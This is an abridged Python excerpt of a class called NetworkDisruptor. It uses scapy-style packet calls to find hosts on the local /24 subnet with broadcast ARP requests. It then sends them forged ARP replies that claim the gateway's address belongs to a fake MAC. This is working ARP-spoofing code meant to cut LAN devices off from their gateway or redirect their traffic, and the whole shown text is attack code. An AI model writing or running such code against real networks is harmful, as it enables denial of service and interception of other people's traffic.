...
class NetworkDisruptor:
    def __init__(self, fake_mac: str = None, gateway_ip: str = None, interface: str = None):
        self.fake_mac = fake_mac or self._generate_random_mac()
    ...
    def _get_lan_targets(self) -> List[str]:
        ...
        try:
            ...
            ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=f"{local_ip}/24"), timeout=2, verbose=False, iface=self.interface)
    ...
    def _send_fake_arp(self, target_ip: str, fake_mac: str) -> None:
        ...
        arp_response = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(op=2, pdst=target_ip, hwdst=fake_mac, psrc=self.gateway_ip, hwsrc=fake_mac)
